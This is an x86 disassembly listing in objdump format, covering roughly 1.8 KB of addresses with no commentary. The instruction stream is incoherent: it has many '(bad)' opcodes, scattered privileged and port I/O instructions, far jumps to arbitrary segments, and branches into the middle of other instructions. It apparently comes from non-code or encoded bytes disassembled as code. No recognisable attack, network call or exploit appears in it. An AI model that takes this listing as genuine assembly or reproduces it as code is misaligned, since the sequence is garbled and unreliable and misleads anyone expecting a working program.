  40e6a7:	div    BYTE PTR [ebx+ebx*4-0x3ce5fc8e]
  40e6ae:	fidiv  WORD PTR [ebp+0x6b2ade5a]
  40e6b4:	fcomp  QWORD PTR [ebp-0x53]
  40e6b7:	push   esi
  40e6b8:	retf   
  40e6b9:	fiadd  DWORD PTR [eax]
  40e6bb:	repnz sbb DWORD PTR [ebx-0x76],edx
  40e6bf:	or     al,bl
  40e6c1:	mov    eax,0xf37dcd00
  40e6c6:	push   ds
  40e6c7:	test   BYTE PTR [ebp+0x116b8254],bl
  40e6cd:	jle    0x40e660
  40e6cf:	popf   
  40e6d0:	rcr    ebp,0xf
  40e6d3:	sub    DWORD PTR [ebx+0x18],esi
  40e6d6:	push   cs
  40e6d7:	xchg   DWORD PTR [eax],ecx
  40e6d9:	iret   
  40e6da:	and    ecx,DWORD PTR [eax]
  40e6dc:	add    al,BYTE PTR [edi+ebp*8-0x52c2cecd]
  40e6e3:	dec    edx
  40e6e4:	xchg   DWORD PTR ds:0x479ef887,ecx
  40e6ea:	mov    bh,0xdb
  40e6ec:	gs fsubr st,st(7)
  40e6ef:	adc    eax,DWORD PTR [edi+0x11]
  40e6f2:	mov    eax,ds:0x145a584e
  40e6f7:	jmp    0x40e6c9
  40e6f9:	jmp    0x40e771
  40e6fb:	or     DWORD PTR [ebx+0x25],ecx
  40e6fe:	add    ch,BYTE PTR [ebp+0x7f]
  40e701:	lock xor eax,0x6652291
  40e707:	xor    eax,0x66994328
  40e70c:	add    dl,dl
  40e70e:	sbb    esp,esp
  40e710:	cli    
  40e711:	cmp    BYTE PTR [ebx],ah
  40e713:	stc    
  40e714:	int    0x7b
  40e716:	fdiv   DWORD PTR [ebx+eiz*8-0x1a]
  40e71a:	das    
  40e71b:	mov    bh,0xdf
  40e71d:	dec    ebp
  40e71e:	add    BYTE PTR [edx-0x2dca3ad0],0x96
  40e725:	and    al,0x9
  40e727:	fcmovnu st,st(3)
  40e729:	ins    DWORD PTR es:[edi],dx
  40e72a:	mov    dh,0xb6
  40e72c:	pop    edx
  40e72d:	pushf  
  40e72e:	cmp    DWORD PTR [ebx-0x2a],esi
  40e731:	mov    ds:0xccb97285,al
  40e736:	(bad)  
  40e737:	in     al,0x4
  40e739:	sti    
  40e73a:	paddsb mm4,mm7
  40e73d:	das    
  40e73e:	mov    esi,0xf7be5eef
  40e743:	mov    ds:0x3d291e7f,eax
  40e748:	into   
  40e749:	pop    edi
  40e74a:	pop    eax
  40e74b:	in     eax,0x95
  40e74d:	push   ebx
  40e74e:	fwait
  40e74f:	sbb    al,0x3b
  40e751:	mov    esi,0xbf1e57c2
  40e756:	shl    BYTE PTR [ecx+0x63645f17],0xab
  40e75d:	retf   0xab70
  40e760:	push   cs
  40e761:	jb     0x40e77f
  40e763:	dec    edx
  40e764:	jecxz  0x40e7b6
  40e766:	sahf   
  40e767:	test   DWORD PTR [eax-0x51],esp
  40e76a:	push   esi
  40e76b:	or     DWORD PTR [esi+0x4991b490],eax
  40e771:	or     edx,DWORD PTR [ecx-0x46ad6e8c]
  40e777:	and    eax,0xa5892c65
  40e77c:	shl    bh,0x63
  40e77f:	xchg   esp,eax
  40e780:	pop    ebp
  40e781:	and    DWORD PTR [ebp+0x4b],esi
  40e784:	sub    bl,al
  40e786:	out    dx,al
  40e787:	imul   edx,DWORD PTR [edx+0x7963bdd5],0x7d129c5e
  40e791:	out    0x5b,al
  40e793:	mov    ebx,0x5b7f408c
  40e798:	stos   DWORD PTR es:[edi],eax
  40e799:	xchg   esp,eax
  40e79a:	mov    ebx,0xfa6dde92
  40e79f:	cli    
  40e7a0:	not    BYTE PTR [ebx+eiz*4]
  40e7a3:	ret    0xe2b8
  40e7a6:	ficomp WORD PTR [ebp-0x58cdd62b]
  40e7ac:	dec    edx
  40e7ad:	test   eax,0x9fbe3d3c
  40e7b2:	push   eax
  40e7b3:	sub    DWORD PTR [ebx+0xc],edi
  40e7b6:	pop    es
  40e7b7:	fnstenv [edi+esi*8+0x4a971f6e]
  40e7be:	and    eax,0x492eddba
  40e7c3:	xchg   edx,eax
  40e7c4:	pop    eax
  40e7c5:	push   es
  40e7c6:	mov    al,ds:0xabcc5bc7
  40e7cb:	in     al,0x1
  40e7cd:	sbb    BYTE PTR [ebx-0xa55fc8c],0x7c
  40e7d4:	lods   al,BYTE PTR ds:[esi]
  40e7d5:	mov    esi,0xcc6dd9b
  40e7da:	inc    eax
  40e7db:	mov    ds:0x7899380e,eax
  40e7e0:	sbb    al,0x49
  40e7e2:	xchg   ebp,eax
  40e7e3:	pavgb  mm6,QWORD PTR [ecx+0x5b]
  40e7e7:	fimul  WORD PTR [eax+0x74086452]
  40e7ed:	scas   eax,DWORD PTR es:[edi]
  40e7ee:	xchg   ebp,eax
  40e7ef:	aas    
  40e7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f1:	dec    eax
  40e7f2:	adc    eax,0x9db6d6b8
  40e7f7:	test   BYTE PTR [ebx+0x75c6d292],0x38
  40e7fe:	sbb    BYTE PTR [eax+0x1041edd2],ch
  40e804:	loopne 0x40e801
  40e806:	ds aad 0x7a
  40e809:	popf   
  40e80a:	mov    DWORD PTR [ecx+0x50e1c229],ebp
  40e810:	dec    ebp
  40e811:	bnd jo 0x40e83e
  40e814:	out    dx,eax
  40e815:	or     al,0x7
  40e817:	add    esp,DWORD PTR [edx]
  40e819:	or     eax,0x2430a2fb
  40e81e:	mov    ah,BYTE PTR [ebx+0x6]
  40e821:	cmp    ah,BYTE PTR [ebx-0x757bd84f]
  40e827:	adc    eax,edx
  40e829:	xchg   ebx,eax
  40e82a:	mov    cs,WORD PTR [edi+eiz*4-0x6cddec40]
  40e831:	or     al,0x30
  40e833:	repz jl 0x40e81f
  40e836:	inc    esi
  40e837:	cmc    
  40e838:	out    dx,al
  40e839:	into   
  40e83a:	mov    dl,0xd9
  40e83c:	bound  eax,QWORD PTR ds:[edi-0x3cf5e6c0]
  40e843:	loope  0x40e7f5
  40e845:	add    BYTE PTR [eax],0xb2
  40e848:	or     bl,cl
  40e84a:	or     al,0xcc
  40e84c:	sub    BYTE PTR [edx+0x7690c308],cl
  40e852:	stos   DWORD PTR es:[edi],eax
  40e853:	vpmulhw xmm6,xmm4,XMMWORD PTR [ebx-0x5ab04108]
  40e85b:	push   edx
  40e85c:	mov    eax,ds:0xb4b1af5e
  40e861:	jg     0x40e8a2
  40e863:	scas   eax,DWORD PTR es:[edi]
  40e864:	cmp    DWORD PTR [ecx*8+0x377bdf37],edi
  40e86b:	pop    ds
  40e86c:	std    
  40e86d:	retf   
  40e86e:	add    DWORD PTR [ebp+0x2b8b9f56],ebp
  40e874:	sub    eax,0xe1dcbf8e
  40e879:	cld    
  40e87a:	jns    0x40e845
  40e87c:	jmp    0x9cf3:0xb5d590e6
  40e883:	ds das 
  40e885:	pop    ecx
  40e886:	fisttp WORD PTR [edx]
  40e888:	fsubr  DWORD PTR [esi+0x7]
  40e88b:	ror    BYTE PTR [edi],1
  40e88d:	nop
  40e88e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e88f:	cmp    eax,0x36328ac8
  40e894:	or     ch,BYTE PTR [edi]
  40e896:	and    al,0x10
  40e898:	add    esp,DWORD PTR [esp+ecx*4+0x2110e588]
  40e89f:	sti    
  40e8a0:	retf   0x20c6
  40e8a3:	arpl   WORD PTR [edx+eiz*2-0x76],ax
  40e8a7:	push   0x2a
  40e8a9:	fwait
  40e8aa:	xor    BYTE PTR [eax+0x2],0x93
  40e8ae:	lods   al,BYTE PTR ds:[esi]
  40e8af:	hlt    
  40e8b0:	ja     0x40e835
  40e8b2:	jnp    0x40e8e6
  40e8b4:	sub    ah,BYTE PTR [eax+0x48100f6b]
  40e8ba:	push   ebx
  40e8bb:	xchg   DWORD PTR [edx+0x4],esp
  40e8be:	into   
  40e8bf:	(bad)  
  40e8c0:	test   BYTE PTR [edx+ecx*2-0x75],0xe9
  40e8c5:	jne    0x40e853
  40e8c7:	cmp    dl,BYTE PTR [esi+0x74]
  40e8ca:	mov    esp,0x2ca863b2
  40e8cf:	(bad)
  40e8d2:	pop    es
  40e8d3:	test   al,0x3e
  40e8d5:	push   ebx
  40e8d6:	shr    BYTE PTR [ebp-0x2c],0x3d
  40e8da:	pop    ebp
  40e8db:	(bad)  
  40e8dc:	in     eax,0xe6
  40e8de:	pop    esp
  40e8df:	push   ebp
  40e8e0:	push   edi
  40e8e1:	mov    bh,0x1e
  40e8e3:	(bad)  
  40e8e4:	mov    ebp,0x76d30021
  40e8e9:	xor    dl,0x45
  40e8ec:	int    0x30
  40e8ee:	sub    DWORD PTR [ebx+0x45],0x3eeb5e02
  40e8f5:	out    0x1a,al
  40e8f7:	add    eax,0x5618581d
  40e8fc:	jl     0x40e8a9
  40e8fe:	pop    ebx
  40e8ff:	test   al,0xd5
  40e901:	or     BYTE PTR [esi+0x47],0x19
  40e905:	lds    ebp,FWORD PTR [edx-0x4b]
  40e908:	sbb    dl,BYTE PTR [ebx-0x2d]
  40e90b:	rcl    esp,cl
  40e90d:	jmp    0x40e984
  40e90f:	adc    cl,BYTE PTR [ebp-0x1c]
  40e912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e913:	push   edx
  40e914:	or     edi,ebx
  40e916:	not    ebx
  40e918:	cli    
  40e919:	add    ebx,edx
  40e91b:	xchg   esi,eax
  40e91c:	xor    BYTE PTR [eax],bl
  40e91e:	or     al,0xe8
  40e920:	jne    0x40e95c
  40e922:	or     bh,BYTE PTR ds:0xf50c060c
  40e928:	in     al,0x23
  40e92a:	iret   
  40e92b:	repz or BYTE PTR [edx+0x25],cl
  40e92f:	jnp    0x40e98f
  40e931:	inc    esi
  40e932:	std    
  40e933:	dec    ecx
  40e934:	pop    edi
  40e935:	xor    BYTE PTR [ebx-0x4],al
  40e938:	out    0x9d,al
  40e93a:	fstp   QWORD PTR [edi+0x57]
  40e93d:	jge    0x40e8cf
  40e93f:	push   edx
  40e940:	dec    ebp
  40e941:	bound  ecx,QWORD PTR [edx+0x71e1a8c5]
  40e947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e948:	out    dx,ax
  40e94a:	jmp    0x40e9c5
  40e94c:	jbe    0x40e9cc
  40e94e:	pop    esp
  40e94f:	sbb    BYTE PTR [esi+0x590e6e6c],al
  40e955:	pop    ebx
  40e956:	pop    ebx
  40e957:	mov    bh,0x52
  40e959:	lods   al,BYTE PTR ds:[esi]
  40e95a:	push   esp
  40e95b:	sub    dl,BYTE PTR [ecx+0x2a]
  40e95e:	add    eax,0xe25ca54
  40e963:	das    
  40e964:	push   esi
  40e965:	jns    0x40e93a
  40e967:	add    esi,DWORD PTR [ebx]
  40e969:	xor    al,0xea
  40e96b:	arpl   WORD PTR [edx+ebp*2-0x75],dx
  40e96f:	dec    esp
  40e970:	dec    esi
  40e971:	iret   
  40e972:	shr    ebx,cl
  40e974:	cmc    
  40e975:	cmp    DWORD PTR [esi+0x62],esi
  40e978:	fwait
  40e979:	mov    ds:0xa5f26c2f,eax
  40e97e:	aas    
  40e97f:	mov    ebp,0x7a274bcc
  40e984:	lods   al,BYTE PTR ds:[esi]
  40e985:	lods   eax,DWORD PTR ds:[esi]
  40e986:	or     eax,0x88c777e8
  40e98b:	les    edi,FWORD PTR [eax]
  40e98d:	aam    0x9a
  40e98f:	add    al,0xd5
  40e991:	add    eax,0xbcaaa0fc
  40e996:	push   ds
  40e997:	xor    al,BYTE PTR [edx-0x491dfc90]
  40e99d:	push   edx
  40e99e:	pop    ds
  40e99f:	mov    ds:0xd661822e,al
  40e9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a5:	mov    al,ds:0x9f464219
  40e9aa:	(bad)  
  40e9ab:	shr    BYTE PTR [eax+0x664faa97],1
  40e9b1:	(bad)  
  40e9b2:	int    0x8b
  40e9b4:	and    BYTE PTR [eax-0x2d],dl
  40e9b7:	test   BYTE PTR [ebp+0x67],cl
  40e9ba:	cmp    cl,BYTE PTR [ecx+eax*2-0x1c]
  40e9be:	stc    
  40e9bf:	out    0xd,al
  40e9c1:	hlt    
  40e9c2:	xchg   ebx,eax
  40e9c3:	mov    dh,0x45
  40e9c5:	test   BYTE PTR [ecx],dl
  40e9c7:	int3   
  40e9c8:	out    dx,al
  40e9c9:	test   eax,0x3526fbe2
  40e9ce:	pop    esp
  40e9cf:	push   esi
  40e9d0:	mov    eax,0x24d163b8
  40e9d5:	add    cl,cl
  40e9d7:	(bad)  
  40e9d8:	iret   
  40e9d9:	or     eax,eax
  40e9db:	xchg   ebp,eax
  40e9dc:	jmp    0x40e9bd
  40e9de:	lock (bad) 
  40e9e0:	mov    ah,0x9b
  40e9e2:	retf   0xa408
  40e9e5:	pop    edx
  40e9e6:	ficomp WORD PTR [eax-0x4a2ec599]
  40e9ec:	repnz stos DWORD PTR es:[edi],eax
  40e9ee:	cmc    
  40e9ef:	cmp    al,0x7a
  40e9f1:	push   eax
  40e9f2:	(bad)  
  40e9f3:	pop    edi
  40e9f4:	fist   DWORD PTR [ebx]
  40e9f6:	mov    al,0x13
  40e9f8:	pushf  
  40e9f9:	das    
  40e9fa:	xor    cl,BYTE PTR [esi+eiz*8]
  40e9fd:	out    0x3,eax
  40e9ff:	mov    eax,0xe42188ad
  40ea04:	out    dx,eax
  40ea05:	jns    0x40e9b4
  40ea07:	std    
  40ea08:	xlat   BYTE PTR ds:[ebx]
  40ea09:	repnz cmp cl,BYTE PTR [eax+0x29]
  40ea0d:	adc    eax,0x514d4fe1
  40ea12:	xlat   BYTE PTR ds:[ebx]
  40ea13:	xchg   BYTE PTR [ebx+eax*2-0x4],al
  40ea17:	inc    edx
  40ea18:	or     dl,bl
  40ea1a:	in     eax,dx
  40ea1b:	lods   eax,DWORD PTR ss:[esi]
  40ea1d:	push   esi
  40ea1e:	mov    ebx,DWORD PTR [esi-0x51]
  40ea21:	inc    edi
  40ea22:	test   eax,0x68d9a65c
  40ea27:	push   eax
  40ea28:	stos   DWORD PTR es:[edi],eax
  40ea29:	aad    0x18
  40ea2b:	stos   DWORD PTR es:[edi],eax
  40ea2c:	push   esi
  40ea2d:	cmp    ecx,DWORD PTR [ebx+0x6aa58b8b]
  40ea33:	lods   eax,DWORD PTR ds:[esi]
  40ea34:	push   esi
  40ea35:	out    dx,al
  40ea36:	idiv   DWORD PTR [edx+0x6c]
  40ea39:	outs   dx,DWORD PTR ds:[esi]
  40ea3a:	outs   dx,DWORD PTR ds:[esi]
  40ea3b:	mov    bl,0xbd
  40ea3d:	mov    ch,0x45
  40ea3f:	mov    bh,0xdb
  40ea41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea42:	fucomip st,st(3)
  40ea44:	shr    edi,1
  40ea46:	imul   DWORD PTR [ebp-0x7efbeb76]
  40ea4c:	sub    eax,0x374191e2
  40ea51:	outs   dx,BYTE PTR ds:[esi]
  40ea52:	lahf   
  40ea53:	adc    al,0xf4
  40ea55:	pop    edi
  40ea56:	sahf   
  40ea57:	leave  
  40ea58:	jp     0x40ea9c
  40ea5a:	adc    bh,ch
  40ea5c:	sub    cl,0xe6
  40ea5f:	fwait
  40ea60:	imul   eax,DWORD PTR [esi+esi*1],0x2d
  40ea64:	dec    ecx
  40ea65:	adc    al,BYTE PTR [esi]
  40ea67:	and    DWORD PTR [ecx],0xffffff83
  40ea6a:	rcl    DWORD PTR [eax-0x18c91253],0xcf
  40ea71:	lods   eax,DWORD PTR ds:[esi]
  40ea72:	and    BYTE PTR [ecx+0x79],dl
  40ea75:	out    dx,eax
  40ea76:	jmp    0x2c13:0x13e31af5
  40ea7d:	cs into 
  40ea7f:	repz cmp eax,0xef9a697f
  40ea85:	sti    
  40ea86:	enter  0xca21,0xa5
  40ea8a:	es retf 
  40ea8c:	pop    ss
  40ea8d:	(bad)  
  40ea8e:	stc    
  40ea8f:	fcmovbe st,st(3)
  40ea91:	fwait
  40ea92:	mov    esp,0x4f0aec70
  40ea97:	sbb    eax,0xc9cce75b
  40ea9c:	xchg   ebx,eax
  40ea9d:	lods   al,BYTE PTR ds:[esi]
  40ea9e:	ins    DWORD PTR es:[edi],dx
  40ea9f:	ss pusha 
  40eaa1:	pop    eax
  40eaa2:	xchg   dl,dh
  40eaa4:	sbb    BYTE PTR [esi+0x63],bl
  40eaa7:	divps  xmm7,XMMWORD PTR [ecx-0x3a]
  40eaab:	mov    ?,WORD PTR ds:0xc396e2f
  40eab1:	mov    eax,ds:0x4a4d6765
  40eab6:	adc    eax,edx
  40eab8:	ins    BYTE PTR es:[edi],dx
  40eab9:	cdq    
  40eaba:	inc    eax
  40eabb:	rol    BYTE PTR cs:[edi-0x68],0x6d
  40eac0:	jmp    0xf3ec4a79
  40eac5:	imul   esp,DWORD PTR [esi-0x60],0x7b
  40eac9:	or     ah,BYTE PTR [ecx+esi*4-0x5c]
  40eacd:	mov    bh,0x3c
  40eacf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ead0:	test   al,0x25
  40ead2:	retf   0x1b68
  40ead5:	(bad)  
  40ead6:	xor    ebp,edx
  40ead8:	mov    al,BYTE PTR [eax+0x26]
  40eadb:	sub    esp,edi
  40eadd:	das    
  40eade:	inc    edx
  40eadf:	mov    ds:0xedd09249,al
  40eae4:	jbe    0x40ea71
  40eae6:	bound  eax,QWORD PTR [eax]
  40eae8:	mov    eax,cs:0x955f0122
  40eaee:	mov    dh,0x1b
  40eaf0:	add    al,0xa0
  40eaf2:	sti    
  40eaf3:	dec    eax
  40eaf4:	jmp    0x4e217552
  40eaf9:	or     BYTE PTR [ebx],0xd5
  40eafc:	xchg   esp,eax
  40eafd:	pop    ebx
  40eafe:	les    ecx,FWORD PTR [ebp-0x6]
  40eb01:	cdq    
  40eb02:	mov    ebx,0x8a952380
  40eb07:	mov    dh,0x5f
  40eb09:	mov    esp,DWORD PTR [ecx]
  40eb0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb0c:	mul    DWORD PTR [esi+0x47]
  40eb0f:	or     ah,0xa3
  40eb12:	and    DWORD PTR [edx],0xffffff86
  40eb15:	xchg   ebx,eax
  40eb16:	mov    edi,0xa2bd7b96
  40eb1b:	xchg   esi,eax
  40eb1c:	push   edi
  40eb1d:	inc    ebp
  40eb1e:	or     al,0x61
  40eb20:	xchg   esi,eax
  40eb21:	dec    edx
  40eb22:	and    eax,0x99272726
  40eb27:	cwde   
  40eb28:	cwde   
  40eb29:	mov    al,0xc8
  40eb2b:	(bad)  
  40eb2c:	mov    ah,0x38
  40eb2e:	mov    gs,WORD PTR [ecx-0x49]
  40eb31:	fld    TBYTE PTR [esi+ebp*2+0x6e]
  40eb35:	adc    al,bh
  40eb37:	xor    ebp,esp
  40eb39:	jb     0x40ead4
  40eb3b:	dec    edx
  40eb3c:	mov    ecx,0xa43870cc
  40eb41:	xlat   BYTE PTR ds:[ebx]
  40eb42:	jmp    0x40eb35
  40eb44:	fwait
  40eb45:	mov    edi,0x7dbf9bf9
  40eb4a:	jmp    0xc0209121
  40eb4f:	out    dx,eax
  40eb50:	mov    esi,0xdaf8defb
  40eb55:	xlat   BYTE PTR ds:[ebx]
  40eb56:	mov    esi,0xef7bcef6
  40eb5b:	mov    ebp,0x87fdbef7
  40eb60:	push   cs
  40eb61:	sbb    eax,0x2640ca40
  40eb66:	dec    ecx
  40eb67:	adc    BYTE PTR [ebp+0x11],al
  40eb6a:	in     eax,dx
  40eb6b:	push   esi
  40eb6c:	mov    ebp,DWORD PTR [ebp-0x2425d253]
  40eb72:	fcomi  st,st(4)
  40eb74:	je     0x40eb64
  40eb76:	add    cl,bh
  40eb78:	rep ins BYTE PTR es:[edi],dx
  40eb7a:	or     al,0x43
  40eb7c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40eb7e:	pushf  
  40eb7f:	sti    
  40eb80:	push   cs
  40eb81:	add    eax,0xfa5022ef
  40eb86:	mov    al,0x4c
  40eb88:	xchg   edx,eax
  40eb89:	sbb    eax,0xb4cdf3c7
  40eb8e:	jl     0x40ec0f
  40eb90:	mov    edx,0xa74e9d36
  40eb95:	inc    edi
  40eb96:	mov    ebx,0xd9dce5dd
  40eb9b:	repz js 0x40ebe0
  40eb9e:	push   eax
  40eb9f:	stos   DWORD PTR es:[edi],eax
  40eba0:	push   ebp
  40eba1:	test   eax,0xd9ecea37
  40eba6:	xor    ecx,ebp
  40eba8:	mov    ebx,0xf807cdf
  40ebad:	mov    esi,0xd2fc1ef7
  40ebb2:	and    al,0xad
  40ebb4:	not    BYTE PTR [eax-0x1e26c0d1]
  40ebba:	in     al,dx
  40ebbb:	test   eax,0xd89d8e55
  40ebc0:	loop   0x40eb73
  40ebc2:	daa    
  40ebc3:	dec    esi
  40ebc4:	rcr    dl,1
  40ebc6:	mov    ds,WORD PTR [eax]
  40ebc8:	les    esi,FWORD PTR [ebp-0x7a]
  40ebcb:	dec    ecx
  40ebcc:	or     eax,0x37804d19
  40ebd1:	or     eax,0x9afc7995
  40ebd6:	xchg   edi,eax
  40ebd8:	add    BYTE PTR [edi+0x445dc43e],cl
  40ebde:	mov    esp,0x548318a5
  40ebe3:	imul   ebx,edx,0xf79a1114
  40ebe9:	push   edi
  40ebea:	push   0xe2b4da40
  40ebef:	out    dx,al
  40ebf0:	fwait
  40ebf1:	mov    ebp,DWORD PTR [ebp+edi*2+0x49a0ac80]
  40ebf8:	push   ebp
  40ebf9:	add    dl,dl
  40ebfb:	or     al,cl
  40ebfd:	mov    ecx,0x1528938e
  40ec02:	add    BYTE PTR [ecx],ch
  40ec04:	or     esp,edi
  40ec06:	test   BYTE PTR [esi+0x3f],bh
  40ec09:	cmp    edx,DWORD PTR [ebp+0x4d1e3f3f]
  40ec0f:	adc    al,0x60
  40ec11:	adc    DWORD PTR [eax-0x702e00c6],0x39e6f47e
  40ec1b:	repz xlat BYTE PTR ds:[ebx]
  40ec1d:	fnstenv [esi-0x7d]
  40ec20:	add    dl,bh
  40ec22:	sahf   
  40ec23:	out    0xd9,eax
  40ec25:	stos   BYTE PTR es:[edi],al
  40ec26:	xor    DWORD PTR [esi-0x2e],eax
  40ec29:	sbb    ecx,DWORD PTR [ecx]
  40ec2b:	scas   eax,DWORD PTR es:[edi]
  40ec2c:	or     BYTE PTR [ebx],bh
  40ec2e:	test   edi,esi
  40ec30:	push   0x40
  40ec32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec33:	(bad)  
  40ec34:	xor    eax,0x420953cf
  40ec39:	lea    edi,[ebx]
  40ec3b:	int    0x6d
  40ec3d:	inc    ebp
  40ec3e:	inc    esi
  40ec3f:	shl    BYTE PTR [edx+0x6ffba376],0xc8
  40ec46:	adc    eax,0xf97d8d78
  40ec4b:	data16 or BYTE PTR [edi+0x33312a54],bh
  40ec52:	xor    eax,ebx
  40ec54:	clc    
  40ec55:	clc    
  40ec56:	cmp    ch,ah
  40ec58:	jb     0x40ec93
  40ec5a:	xchg   ebx,eax
  40ec5b:	fadd   QWORD PTR [eax+eiz*2]
  40ec5e:	jnp    0x40ecdb
  40ec60:	fwait
  40ec61:	lods   eax,DWORD PTR ds:[esi]
  40ec62:	lods   eax,DWORD PTR ds:[esi]
  40ec63:	sub    eax,0x7c77855b
  40ec68:	jl     0x40ec06
  40ec6a:	push   0xffffffb5
  40ec6c:	dec    edx
  40ec6d:	adc    BYTE PTR [esi+esi*8],al
  40ec70:	push   ds
  40ec71:	pop    edx
  40ec72:	adc    ch,BYTE PTR [edi+edi*1-0xa]
  40ec76:	fsub   DWORD PTR [ebx-0x39]
  40ec79:	pop    ds
  40ec7a:	jnp    0x40ec68
  40ec7c:	mov    cl,0x53
  40ec7e:	adc    BYTE PTR [edi-0x55],0xd5
  40ec82:	call   0xa6a6:0x7b8b8b8b
  40ec89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec8a:	es daa 
  40ec8c:	es neg BYTE PTR es:[eax+edi*1]
  40ec91:	jo     0x40ecf3
  40ec93:	outs   dx,BYTE PTR ds:[esi]
  40ec94:	call   edx
  40ec96:	shl    dl,cl
  40ec98:	add    edi,DWORD PTR [edi-0x12]
  40ec9b:	iret   
  40ec9c:	mov    ebp,0x8585cee6
  40eca1:	or     ebp,0x66
  40eca4:	jae    0x40ecc8
  40eca6:	push   cs
  40eca7:	inc    ebx
  40eca8:	ss aaa 
  40ecaa:	aaa    
  40ecab:	fstp   DWORD PTR [eax+0x5f]
  40ecae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecaf:	mov    ds:0x8e388755,eax
  40ecb4:	sub    eax,0x96dafb71
  40ecb9:	pusha  
  40ecba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecbb:	pop    eax
  40ecbc:	scas   al,BYTE PTR es:[edi]
  40ecbd:	(bad)  
  40ecbe:	std    
  40ecbf:	and    BYTE PTR [eax-0x4f],dl
  40ecc2:	push   cs
  40ecc3:	mov    bh,0xa1
  40ecc5:	in     eax,0xed
  40ecc7:	or     al,BYTE PTR [edx]
  40ecc9:	or     bl,al
  40eccb:	mov    BYTE PTR [ebp-0x2829d273],cl
  40ecd1:	aaa    
  40ecd2:	cmp    ecx,esi
  40ecd4:	retf   0x4a29
  40ecd7:	in     eax,0x32
  40ecd9:	mov    ch,0x7a
  40ecdb:	xchg   ebp,eax
  40ecdc:	mov    cl,0xb1
  40ecde:	xor    esi,ebp
  40ece0:	sahf   
  40ece1:	fwait
  40ece2:	in     al,0xc1
  40ece4:	mov    ebx,0xfbe77c1b
  40ece9:	pop    ss
  40ecea:	adc    BYTE PTR [ecx+ebx*1],dh
  40eced:	les    esp,FWORD PTR [ebp-0x2a]
  40ecf0:	aaa    
  40ecf1:	add    esi,DWORD PTR [esi-0x416344c9]
  40ecf7:	nop
  40ecf8:	jo     0x40ed6f
  40ecfa:	jne    0x40ec87
  40ecfc:	scas   eax,DWORD PTR es:[edi]
  40ecfd:	push   ds
  40ecfe:	sbb    eax,0x36f9ec72
  40ed03:	fld    TBYTE PTR [ebp-0xf9a05fc]
  40ed09:	jge    0x40ecb3
  40ed0b:	das    
  40ed0c:	loop   0x40ed63
  40ed0e:	sbb    edi,DWORD PTR [edx]
  40ed10:	cld    
  40ed11:	and    BYTE PTR [ecx],al
  40ed13:	sbb    DWORD PTR [ecx],esp
  40ed15:	loop   0x40ed18
  40ed17:	and    al,0x2d
  40ed19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed1a:	dec    edx
  40ed1b:	cwde   
  40ed1c:	and    BYTE PTR [esi],ah
  40ed1e:	sbb    eax,0x988362b7
  40ed23:	test   BYTE PTR [eax+0x46],al
  40ed26:	or     DWORD PTR [ecx],ebx
  40ed28:	mul    DWORD PTR [edx]
  40ed2a:	inc    esi
  40ed2b:	xor    ecx,eax
  40ed2d:	xor    DWORD PTR [ecx],eax
  40ed2f:	sbb    al,0xc1
  40ed31:	xchg   ebx,eax
  40ed32:	outs   dx,BYTE PTR ds:[esi]
  40ed33:	dec    ecx
  40ed34:	cdq    
  40ed35:	outs   dx,BYTE PTR ds:[esi]
  40ed36:	lods   al,BYTE PTR ds:[esi]
  40ed37:	ret    0x380
  40ed3a:	dec    edi
  40ed3b:	xor    cl,al
  40ed3d:	push   0x0
  40ed3f:	jbe    0x40ed5d
  40ed41:	xchg   esi,eax
  40ed42:	retf   
  40ed43:	stos   BYTE PTR es:[edi],al
  40ed44:	les    ebx,FWORD PTR [esi+edi*4+0x36]
  40ed48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed49:	outs   dx,BYTE PTR ds:[esi]
  40ed4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed4b:	mov    esi,0x7afebe9e
  40ed50:	fld    TBYTE PTR [esi+0x10]
  40ed53:	inc    eax
  40ed54:	pop    edi
  40ed55:	or     BYTE PTR [ecx-0x49],al
  40ed58:	fist   DWORD PTR [ecx-0x3f]
  40ed5b:	das    
  40ed5c:	xor    ch,BYTE PTR ds:0x749aa563
  40ed62:	cwde   
  40ed63:	sbb    BYTE PTR [ecx+0x4f],0x89
  40ed67:	ret    
  40ed68:	or     al,0x8a
  40ed6a:	imul   esp,DWORD PTR [esp+eax*2],0xffffffb8
  40ed6e:	test   eax,0xd7b4e796
  40ed73:	xor    ch,dl
  40ed75:	pop    ebp
  40ed76:	psubd  mm2,QWORD PTR [edi]
  40ed79:	xor    DWORD PTR [ecx+0x54a98e38],eax
  40ed7f:	sub    cl,ah
  40ed81:	int    0xcd
  40ed83:	xor    DWORD PTR ds:0xf7676d3d,edi
  40ed89:	mov    ecx,0x5b5bcd61
  40ed8e:	pop    ebx
  40ed8f:	lods   al,BYTE PTR ds:[esi]
  40ed90:	scas   eax,DWORD PTR es:[edi]
  40ed91:	scas   eax,DWORD PTR es:[edi]
  40ed92:	rcl    ebp,cl
  40ed94:	mov    bl,0xff
  40ed96:	es daa 
  40ed98:	daa    
  40ed99:	imul   esi,DWORD PTR [esi],0x841969b
  40ed9f:	and    DWORD PTR [eax],ecx
  40eda1:	ret    
  40eda2:	nop
  40eda3:	retf   
  40eda4:	xchg   edi,eax
  40eda5:	das    
  40eda6:	xor    ebx,DWORD PTR [eax]
  40eda8:	or     al,0x90
  40edaa:	push   edx
  40edab:	not    BYTE PTR [ecx-0x27]
  40edae:	xor    eax,0xf5ec801a
  40edb3:	jp     0x40eda6
  40edb5:	leave  
  40edb6:	xchg   ebx,eax
  40edb7:	daa    
  40edb8:	das    
  40edb9:	mov    ds:0xe8c7434a,al
  40edbe:	int3   
  40edbf:	adc    al,0xd5
  40edc1:	push   0xffffffb5
